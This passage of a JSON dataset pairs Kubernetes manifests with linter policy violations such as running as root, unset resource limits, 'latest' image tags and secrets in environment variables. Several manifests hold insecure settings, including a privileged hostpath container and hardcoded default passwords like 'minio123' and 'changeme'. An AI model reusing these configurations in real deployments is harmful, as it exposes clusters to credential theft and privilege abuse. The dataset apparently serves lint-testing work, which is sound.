    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-hostpathplugin\nspec:\n  selector:\n    matchLabels:\n      app: csi-hostpathplugin\n  template:\n    metadata:\n      labels:\n        app: csi-hostpathplugin\n    spec:\n      serviceAccountName: csi-driver-registrar\n      containers:\n      - name: driver-registrar\n        image: quay.io/k8scsi/driver-registrar:v0.4.1\n        args:\n        - --v=5\n        - --csi-address=/csi/csi.sock\n        - --kubelet-registration-path=/var/lib/kubelet/plugins/csi-hostpath/csi.sock\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: Always\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /registration\n          name: registration-dir\n      - name: hostpath\n        image: quay.io/k8scsi/hostpathplugin:v0.4.1\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: Always\n        securityContext:\n          privileged: true\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/pods\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/csi-hostpath\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/pods\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins\n          type: Directory\n        name: registration-dir\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hostpath\" has memory limit 0"
  },
  {
    "id": "2958",
    "manifest_path": "data/manifests/the_stack_sample/sample_0853.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    kubernetes.io/cluster-service: 'true'\n    kubernetes.io/name: Heapster\n  name: heapster\n  namespace: kube-system\nspec:\n  ports:\n  - port: 80\n    targetPort: 8082\n  selector:\n    k8s-app: heapster\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[k8s-app:heapster])"
  },
  {
    "id": "2959",
    "manifest_path": "data/manifests/the_stack_sample/sample_0855.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: skuleshov/payment_service:v0.0.2\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "2960",
    "manifest_path": "data/manifests/the_stack_sample/sample_0855.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: skuleshov/payment_service:v0.0.2\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "2961",
    "manifest_path": "data/manifests/the_stack_sample/sample_0855.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: skuleshov/payment_service:v0.0.2\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "2962",
    "manifest_path": "data/manifests/the_stack_sample/sample_0855.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: skuleshov/payment_service:v0.0.2\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"server\" has cpu request 0"
  },
  {
    "id": "2963",
    "manifest_path": "data/manifests/the_stack_sample/sample_0855.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: skuleshov/payment_service:v0.0.2\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"server\" has memory limit 0"
  },
  {
    "id": "2964",
    "manifest_path": "data/manifests/the_stack_sample/sample_0856.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: project-api\n  name: project-api\n  namespace: prod\nspec:\n  ports:\n  - name: 8080-tcp\n    port: 8080\n    protocol: TCP\n    targetPort: 8080\n  - name: 8443-tcp\n    port: 8443\n    protocol: TCP\n    targetPort: 8443\n  - name: 8778-tcp\n    port: 8778\n    protocol: TCP\n    targetPort: 8778\n  selector:\n    app: project-api\n    deploymentconfig: project-api\n  sessionAffinity: None\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:project-api deploymentconfig:project-api])"
  },
  {
    "id": "2965",
    "manifest_path": "data/manifests/the_stack_sample/sample_0858.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: test\n  name: test21\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: test\n  template:\n    metadata:\n      labels:\n        run: test\n    spec:\n      containers:\n      - image: redis:latest\n        name: container1\n      - image: docker.io/dgeiger/alpine:3\n        name: container2\n      - image: docker.io/dgeiger/nginx@sha256:e770165fef9e36b990882a4083d8ccf5e29e469a8609bb6b2e3b47d9510e2c8d\n        name: container3\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"container1\" is using an invalid container image, \"redis:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2966",
    "manifest_path": "data/manifests/the_stack_sample/sample_0858.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: test\n  name: test21\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: test\n  template:\n    metadata:\n      labels:\n        run: test\n    spec:\n      containers:\n      - image: redis:latest\n        name: container1\n      - image: docker.io/dgeiger/alpine:3\n        name: container2\n      - image: docker.io/dgeiger/nginx@sha256:e770165fef9e36b990882a4083d8ccf5e29e469a8609bb6b2e3b47d9510e2c8d\n        name: container3\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"container1\" does not have a read-only root file system"
  },
  {
    "id": "2967",
    "manifest_path": "data/manifests/the_stack_sample/sample_0858.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: test\n  name: test21\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: test\n  template:\n    metadata:\n      labels:\n        run: test\n    spec:\n      containers:\n      - image: redis:latest\n        name: container1\n      - image: docker.io/dgeiger/alpine:3\n        name: container2\n      - image: docker.io/dgeiger/nginx@sha256:e770165fef9e36b990882a4083d8ccf5e29e469a8609bb6b2e3b47d9510e2c8d\n        name: container3\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"container2\" does not have a read-only root file system"
  },
  {
    "id": "2968",
    "manifest_path": "data/manifests/the_stack_sample/sample_0858.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: test\n  name: test21\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: test\n  template:\n    metadata:\n      labels:\n        run: test\n    spec:\n      containers:\n      - image: redis:latest\n        name: container1\n      - image: docker.io/dgeiger/alpine:3\n        name: container2\n      - image: docker.io/dgeiger/nginx@sha256:e770165fef9e36b990882a4083d8ccf5e29e469a8609bb6b2e3b47d9510e2c8d\n        name: container3\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"container3\" does not have a read-only root file system"
  },
  {
    "id": "2969",
    "manifest_path": "data/manifests/the_stack_sample/sample_0858.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: test\n  name: test21\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: test\n  template:\n    metadata:\n      labels:\n        run: test\n    spec:\n      containers:\n      - image: redis:latest\n        name: container1\n      - image: docker.io/dgeiger/alpine:3\n        name: container2\n      - image: docker.io/dgeiger/nginx@sha256:e770165fef9e36b990882a4083d8ccf5e29e469a8609bb6b2e3b47d9510e2c8d\n        name: container3\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"container1\" is not set to runAsNonRoot"
  },
  {
    "id": "2970",
    "manifest_path": "data/manifests/the_stack_sample/sample_0858.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: test\n  name: test21\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: test\n  template:\n    metadata:\n      labels:\n        run: test\n    spec:\n      containers:\n      - image: redis:latest\n        name: container1\n      - image: docker.io/dgeiger/alpine:3\n        name: container2\n      - image: docker.io/dgeiger/nginx@sha256:e770165fef9e36b990882a4083d8ccf5e29e469a8609bb6b2e3b47d9510e2c8d\n        name: container3\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"container2\" is not set to runAsNonRoot"
  },
  {
    "id": "2971",
    "manifest_path": "data/manifests/the_stack_sample/sample_0858.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: test\n  name: test21\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: test\n  template:\n    metadata:\n      labels:\n        run: test\n    spec:\n      containers:\n      - image: redis:latest\n        name: container1\n      - image: docker.io/dgeiger/alpine:3\n        name: container2\n      - image: docker.io/dgeiger/nginx@sha256:e770165fef9e36b990882a4083d8ccf5e29e469a8609bb6b2e3b47d9510e2c8d\n        name: container3\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"container3\" is not set to runAsNonRoot"
  },
  {
    "id": "2972",
    "manifest_path": "data/manifests/the_stack_sample/sample_0858.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: test\n  name: test21\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: test\n  template:\n    metadata:\n      labels:\n        run: test\n    spec:\n      containers:\n      - image: redis:latest\n        name: container1\n      - image: docker.io/dgeiger/alpine:3\n        name: container2\n      - image: docker.io/dgeiger/nginx@sha256:e770165fef9e36b990882a4083d8ccf5e29e469a8609bb6b2e3b47d9510e2c8d\n        name: container3\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"container1\" has cpu request 0"
  },
  {
    "id": "2973",
    "manifest_path": "data/manifests/the_stack_sample/sample_0858.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: test\n  name: test21\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: test\n  template:\n    metadata:\n      labels:\n        run: test\n    spec:\n      containers:\n      - image: redis:latest\n        name: container1\n      - image: docker.io/dgeiger/alpine:3\n        name: container2\n      - image: docker.io/dgeiger/nginx@sha256:e770165fef9e36b990882a4083d8ccf5e29e469a8609bb6b2e3b47d9510e2c8d\n        name: container3\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"container2\" has cpu request 0"
  },
  {
    "id": "2974",
    "manifest_path": "data/manifests/the_stack_sample/sample_0858.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: test\n  name: test21\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: test\n  template:\n    metadata:\n      labels:\n        run: test\n    spec:\n      containers:\n      - image: redis:latest\n        name: container1\n      - image: docker.io/dgeiger/alpine:3\n        name: container2\n      - image: docker.io/dgeiger/nginx@sha256:e770165fef9e36b990882a4083d8ccf5e29e469a8609bb6b2e3b47d9510e2c8d\n        name: container3\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"container3\" has cpu request 0"
  },
  {
    "id": "2975",
    "manifest_path": "data/manifests/the_stack_sample/sample_0858.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: test\n  name: test21\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: test\n  template:\n    metadata:\n      labels:\n        run: test\n    spec:\n      containers:\n      - image: redis:latest\n        name: container1\n      - image: docker.io/dgeiger/alpine:3\n        name: container2\n      - image: docker.io/dgeiger/nginx@sha256:e770165fef9e36b990882a4083d8ccf5e29e469a8609bb6b2e3b47d9510e2c8d\n        name: container3\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"container1\" has memory limit 0"
  },
  {
    "id": "2976",
    "manifest_path": "data/manifests/the_stack_sample/sample_0858.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: test\n  name: test21\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: test\n  template:\n    metadata:\n      labels:\n        run: test\n    spec:\n      containers:\n      - image: redis:latest\n        name: container1\n      - image: docker.io/dgeiger/alpine:3\n        name: container2\n      - image: docker.io/dgeiger/nginx@sha256:e770165fef9e36b990882a4083d8ccf5e29e469a8609bb6b2e3b47d9510e2c8d\n        name: container3\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"container2\" has memory limit 0"
  },
  {
    "id": "2977",
    "manifest_path": "data/manifests/the_stack_sample/sample_0858.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: test\n  name: test21\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: test\n  template:\n    metadata:\n      labels:\n        run: test\n    spec:\n      containers:\n      - image: redis:latest\n        name: container1\n      - image: docker.io/dgeiger/alpine:3\n        name: container2\n      - image: docker.io/dgeiger/nginx@sha256:e770165fef9e36b990882a4083d8ccf5e29e469a8609bb6b2e3b47d9510e2c8d\n        name: container3\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"container3\" has memory limit 0"
  },
  {
    "id": "2978",
    "manifest_path": "data/manifests/the_stack_sample/sample_0859.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: minio-deployment\nspec:\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      volumes:\n      - name: gcs-credentials\n        secret:\n          secretName: gcs-credentials\n      containers:\n      - name: minio\n        image: minio/minio:RELEASE.2020-05-16T01-33-21Z\n        args:\n        - gateway\n        - gcs\n        - gcp_project_id\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/credentials/application_default_credentials.json\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: gcs-credentials\n          mountPath: /etc/credentials\n          readOnly: true\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable MINIO_SECRET_KEY in container \"minio\" found"
  },
  {
    "id": "2979",
    "manifest_path": "data/manifests/the_stack_sample/sample_0859.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: minio-deployment\nspec:\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      volumes:\n      - name: gcs-credentials\n        secret:\n          secretName: gcs-credentials\n      containers:\n      - name: minio\n        image: minio/minio:RELEASE.2020-05-16T01-33-21Z\n        args:\n        - gateway\n        - gcs\n        - gcp_project_id\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/credentials/application_default_credentials.json\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: gcs-credentials\n          mountPath: /etc/credentials\n          readOnly: true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"minio\" does not have a read-only root file system"
  },
  {
    "id": "2980",
    "manifest_path": "data/manifests/the_stack_sample/sample_0859.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: minio-deployment\nspec:\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      volumes:\n      - name: gcs-credentials\n        secret:\n          secretName: gcs-credentials\n      containers:\n      - name: minio\n        image: minio/minio:RELEASE.2020-05-16T01-33-21Z\n        args:\n        - gateway\n        - gcs\n        - gcp_project_id\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/credentials/application_default_credentials.json\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: gcs-credentials\n          mountPath: /etc/credentials\n          readOnly: true\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"minio\" is not set to runAsNonRoot"
  },
  {
    "id": "2981",
    "manifest_path": "data/manifests/the_stack_sample/sample_0859.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: minio-deployment\nspec:\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      volumes:\n      - name: gcs-credentials\n        secret:\n          secretName: gcs-credentials\n      containers:\n      - name: minio\n        image: minio/minio:RELEASE.2020-05-16T01-33-21Z\n        args:\n        - gateway\n        - gcs\n        - gcp_project_id\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/credentials/application_default_credentials.json\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: gcs-credentials\n          mountPath: /etc/credentials\n          readOnly: true\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"minio\" has cpu request 0"
  },
  {
    "id": "2982",
    "manifest_path": "data/manifests/the_stack_sample/sample_0859.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: minio-deployment\nspec:\n  selector:\n    matchLabels:\n      app: minio\n  template:\n    metadata:\n      labels:\n        app: minio\n    spec:\n      volumes:\n      - name: gcs-credentials\n        secret:\n          secretName: gcs-credentials\n      containers:\n      - name: minio\n        image: minio/minio:RELEASE.2020-05-16T01-33-21Z\n        args:\n        - gateway\n        - gcs\n        - gcp_project_id\n        env:\n        - name: MINIO_ACCESS_KEY\n          value: minio\n        - name: MINIO_SECRET_KEY\n          value: minio123\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/credentials/application_default_credentials.json\n        ports:\n        - containerPort: 9000\n        volumeMounts:\n        - name: gcs-credentials\n          mountPath: /etc/credentials\n          readOnly: true\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"minio\" has memory limit 0"
  },
  {
    "id": "2983",
    "manifest_path": "data/manifests/the_stack_sample/sample_0860.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: kube-ui\n  namespace: kube-system\n  labels:\n    k8s-app: kube-ui\n    kubernetes.io/cluster-service: 'true'\n    kubernetes.io/name: KubeUI\nspec:\n  selector:\n    k8s-app: kube-ui\n  ports:\n  - port: 80\n    targetPort: 8080\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[k8s-app:kube-ui])"
  },
  {
    "id": "2984",
    "manifest_path": "data/manifests/the_stack_sample/sample_0864.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    io.sourceloop.service: postgres-orchestrator\n  name: postgres-orchestrator\n  namespace: sourceloop-sandbox\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      io.sourceloop.service: postgres-orchestrator\n  template:\n    metadata:\n      labels:\n        io.sourceloop.service: postgres-orchestrator\n    spec:\n      containers:\n      - args:\n        - bash\n        - -c\n        - 'export PGPASSWORD=${POSTGRES_PASSWORD:-changeme}; sleep 30;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          authentication_db'' 2>&1;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          notification_db'' 2>&1;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          workflow_db'' 2>&1;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          audit_db'' 2>&1;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          scheduler_db'' 2>&1;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          in_mail_db'' 2>&1;\n\n          exit 0'\n        env:\n        - name: PGDATA\n          value: /data/postgres\n        - name: PGPASSWORD\n          value: changeme\n        - name: POSTGRES_PASSWORD\n          value: changeme\n        - name: POSTGRES_USER\n          value: postgres\n        image: postgres\n        name: postgres-orchestrator\n        ports:\n        - containerPort: 5433\n        resources: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"postgres-orchestrator\" is using an invalid container image, \"postgres\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2985",
    "manifest_path": "data/manifests/the_stack_sample/sample_0864.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    io.sourceloop.service: postgres-orchestrator\n  name: postgres-orchestrator\n  namespace: sourceloop-sandbox\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      io.sourceloop.service: postgres-orchestrator\n  template:\n    metadata:\n      labels:\n        io.sourceloop.service: postgres-orchestrator\n    spec:\n      containers:\n      - args:\n        - bash\n        - -c\n        - 'export PGPASSWORD=${POSTGRES_PASSWORD:-changeme}; sleep 30;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          authentication_db'' 2>&1;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          notification_db'' 2>&1;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          workflow_db'' 2>&1;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          audit_db'' 2>&1;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          scheduler_db'' 2>&1;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          in_mail_db'' 2>&1;\n\n          exit 0'\n        env:\n        - name: PGDATA\n          value: /data/postgres\n        - name: PGPASSWORD\n          value: changeme\n        - name: POSTGRES_PASSWORD\n          value: changeme\n        - name: POSTGRES_USER\n          value: postgres\n        image: postgres\n        name: postgres-orchestrator\n        ports:\n        - containerPort: 5433\n        resources: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"postgres-orchestrator\" does not have a read-only root file system"
  },
  {
    "id": "2986",
    "manifest_path": "data/manifests/the_stack_sample/sample_0864.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    io.sourceloop.service: postgres-orchestrator\n  name: postgres-orchestrator\n  namespace: sourceloop-sandbox\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      io.sourceloop.service: postgres-orchestrator\n  template:\n    metadata:\n      labels:\n        io.sourceloop.service: postgres-orchestrator\n    spec:\n      containers:\n      - args:\n        - bash\n        - -c\n        - 'export PGPASSWORD=${POSTGRES_PASSWORD:-changeme}; sleep 30;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          authentication_db'' 2>&1;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          notification_db'' 2>&1;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          workflow_db'' 2>&1;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          audit_db'' 2>&1;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          scheduler_db'' 2>&1;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          in_mail_db'' 2>&1;\n\n          exit 0'\n        env:\n        - name: PGDATA\n          value: /data/postgres\n        - name: PGPASSWORD\n          value: changeme\n        - name: POSTGRES_PASSWORD\n          value: changeme\n        - name: POSTGRES_USER\n          value: postgres\n        image: postgres\n        name: postgres-orchestrator\n        ports:\n        - containerPort: 5433\n        resources: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"postgres-orchestrator\" is not set to runAsNonRoot"
  },
  {
    "id": "2987",
    "manifest_path": "data/manifests/the_stack_sample/sample_0864.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    io.sourceloop.service: postgres-orchestrator\n  name: postgres-orchestrator\n  namespace: sourceloop-sandbox\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      io.sourceloop.service: postgres-orchestrator\n  template:\n    metadata:\n      labels:\n        io.sourceloop.service: postgres-orchestrator\n    spec:\n      containers:\n      - args:\n        - bash\n        - -c\n        - 'export PGPASSWORD=${POSTGRES_PASSWORD:-changeme}; sleep 30;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          authentication_db'' 2>&1;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          notification_db'' 2>&1;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          workflow_db'' 2>&1;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          audit_db'' 2>&1;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          scheduler_db'' 2>&1;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          in_mail_db'' 2>&1;\n\n          exit 0'\n        env:\n        - name: PGDATA\n          value: /data/postgres\n        - name: PGPASSWORD\n          value: changeme\n        - name: POSTGRES_PASSWORD\n          value: changeme\n        - name: POSTGRES_USER\n          value: postgres\n        image: postgres\n        name: postgres-orchestrator\n        ports:\n        - containerPort: 5433\n        resources: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"postgres-orchestrator\" has cpu request 0"
  },
  {
    "id": "2988",
    "manifest_path": "data/manifests/the_stack_sample/sample_0864.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    io.sourceloop.service: postgres-orchestrator\n  name: postgres-orchestrator\n  namespace: sourceloop-sandbox\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      io.sourceloop.service: postgres-orchestrator\n  template:\n    metadata:\n      labels:\n        io.sourceloop.service: postgres-orchestrator\n    spec:\n      containers:\n      - args:\n        - bash\n        - -c\n        - 'export PGPASSWORD=${POSTGRES_PASSWORD:-changeme}; sleep 30;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          authentication_db'' 2>&1;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          notification_db'' 2>&1;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          workflow_db'' 2>&1;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          audit_db'' 2>&1;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          scheduler_db'' 2>&1;\n\n          psql -U ${POSTGRES_USER:-postgres} -d postgres -h postgres -c ''create database\n          in_mail_db'' 2>&1;\n\n          exit 0'\n        env:\n        - name: PGDATA\n          value: /data/postgres\n        - name: PGPASSWORD\n          value: changeme\n        - name: POSTGRES_PASSWORD\n          value: changeme\n        - name: POSTGRES_USER\n          value: postgres\n        image: postgres\n        name: postgres-orchestrator\n        ports:\n        - containerPort: 5433\n        resources: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"postgres-orchestrator\" has memory limit 0"
  },
  {
    "id": "2989",
    "manifest_path": "data/manifests/the_stack_sample/sample_0865.yaml",
